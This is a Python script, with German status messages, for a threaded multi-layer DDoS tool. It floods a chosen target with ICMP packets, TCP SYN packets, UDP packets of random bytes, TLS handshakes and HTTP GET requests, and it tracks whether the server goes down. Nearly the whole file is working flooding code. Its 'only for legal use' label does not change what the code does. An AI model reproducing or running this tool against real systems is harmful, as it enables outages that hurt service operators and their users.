import argparse
import random
import socket
import ssl
import threading
import time

import requests
from scapy.all import IP, TCP, ICMP, send

server_status_global = "Unbekannt"
server_status_global_array = []


def attack_layer3_icmp(target_ip, progress):
    pkt = IP(dst=target_ip) / ICMP()
    send(pkt, verbose=0)
    progress['layer3'] += 1


def attack_layer4_tcp(target_ip, target_port, progress):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
    pkt = ip / tcp
    send(pkt, verbose=0)
    progress['layer4_tcp'] += 1


def attack_layer4_udp(target_ip, target_port, progress):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    msg = random._urandom(2048)
    try:
        sock.sendto(msg, (target_ip, target_port))
        progress['layer4_udp'] += 1
    except:
        pass


def attack_layer6_tls(target_ip, target_port, progress):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((target_ip, target_port), timeout=3) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip):
                progress['layer6'] += 1
    except:
        pass


def attack_layer7_http(target_ip, progress):
    url = f"http://{target_ip}/"
    try:
        requests.get(url, timeout=2)
        progress['layer7'] += 1
    except requests.exceptions.RequestException:
        pass


def run_attack(layers, target_ip, target_port, progress, start_time, duration):
    while True:
        if duration and time.time() - start_time >= duration:
            break

        if "3" in layers:
            attack_layer3_icmp(target_ip, progress)
        if "4" in layers:
            attack_layer4_tcp(target_ip, target_port, progress)
            attack_layer4_udp(target_ip, target_port, progress)
        if "6" in layers:
            attack_layer6_tls(target_ip, target_port, progress)
        if "7" in layers:
            attack_layer7_http(target_ip, progress)


def display_status(progress, start_time, duration, monitor_layer7, target_ip):
    prev_layer7 = -1
    while True:
        elapsed = int(time.time() - start_time)
        if duration and elapsed >= duration:
            break

        hours, remainder = divmod(elapsed, 3600)
        minutes, seconds = divmod(remainder, 60)
        time_str = f"{hours:02}:{minutes:02}:{seconds:02}"

        if duration:
            remaining = max(0, duration - elapsed)
            rh, rr = divmod(remaining, 3600)
            rm, rs = divmod(rr, 60)
            rem_str = f"{rh:02}:{rm:02}:{rs:02}"
        else:
            rem_str = "unendlich"

        server_status = f"Server: {server_status_global}"

        output = (
            f"\r[Dauer: {time_str} | Verbleibend: {rem_str}] "
            f"ICMP: {progress['layer3']} | TCP: {progress['layer4_tcp']} | UDP: {progress['layer4_udp']} | "
            f"TLS: {progress['layer6']} | HTTP: {progress['layer7']} | {server_status}"
        )
        print(output, end="")
        time.sleep(1)


def print_log(progress, start_time, duration):
    global server_status_global
    elapsed = int(time.time() - start_time)
    hours, remainder = divmod(elapsed, 3600)
    minutes, seconds = divmod(remainder, 60)
    time_str = f"{hours:02}:{minutes:02}:{seconds:02}"

    print(f"\n\n[Endstatus nach {time_str}]: {server_status_global}")
    print(f"  Layer 3 (ICMP): {progress['layer3']} Pakete")
    print(f"  Layer 4 (TCP SYN): {progress['layer4_tcp']} Pakete")
    print(f"  Layer 4 (UDP): {progress['layer4_udp']} Pakete")
    print(f"  Layer 6 (TLS Handshake): {progress['layer6']} Verbindungen")
    print(f"  Layer 7 (HTTP GET): {progress['layer7']} Anfragen")

    print("\n\nServer Access:")
    for i in server_status_global_array:
        print(f"{i['time']}: {i['status']}")


def check_server_status_periodically(target_ip, stop_event, start_time):
    global server_status_global
    global server_status_global_array
    while not stop_event.is_set():
        server_status_global_old = server_status_global
        try:
            requests.get(f"http://{target_ip}/", timeout=2)
            server_status_global = "[32mONLINE[0m"
        except requests.exceptions.RequestException:
            server_status_global = "[31mDOWN[0m"
        if server_status_global != server_status_global_old:
            elapsed = int(time.time() - start_time)
            hours, remainder = divmod(elapsed, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_str = f"{hours:02}:{minutes:02}:{seconds:02}"

            server_status_global_array.append({
                "status": server_status_global,
                "time": time_str
            })

        time.sleep(1)  # prüfe jede Sekunde


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Multilayer DDoS Test Tool (only for legal use!) | Please run with sudo to use layer 4")
    parser.add_argument("target", help="Ziel-IP oder Hostname")
    parser.add_argument("--port", type=int, default=80, help="Zielport (Standard: 80)")
    parser.add_argument("--layer", required=True, help="Layer angeben: 3,4,6,7 oder 'all'")
    parser.add_argument("--threads", type=int, default=50, help="Anzahl Threads")
    parser.add_argument("--duration", type=int, help="Dauer des Angriffs in Sekunden")
    args = parser.parse_args()

    layers = args.layer.split(",") if args.layer != "all" else ["3", "4", "6", "7"]

    print(
        f"\n[!] Angriff gestartet auf {args.target}:{args.port} | Layer: {','.join(layers)} | Threads: {args.threads} | Dauer: {args.duration if args.duration else 'unendlich'} Sekunden\n"
    )

    progress = {
        'layer3': 0,
        'layer4_tcp': 0,
        'layer4_udp': 0,
        'layer6': 0,
        'layer7': 0
    }

    start_time = time.time()

    try:
        for _ in range(args.threads):
            t = threading.Thread(target=run_attack,
                                 args=(layers, args.target, args.port, progress, start_time, args.duration))
            t.daemon = True
            t.start()

        display = threading.Thread(target=display_status,
                                   args=(progress, start_time, args.duration, "7" in layers, args.target))
        stop_event = threading.Event()
        server_monitor = threading.Thread(target=check_server_status_periodically,
                                          args=(args.target, stop_event, start_time))
        server_monitor.daemon = True
        server_monitor.start()
        display.start()
        display.join()

        print("\n[!] Angriff beendet.")
        print_log(progress, start_time, args.duration)

    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt: Angriff abgebrochen durch Benutzer.")
        print_log(progress, start_time, args.duration)
        print("\n[!] Angriff beendet.")
        stop_event.set()
        server_monitor.join()
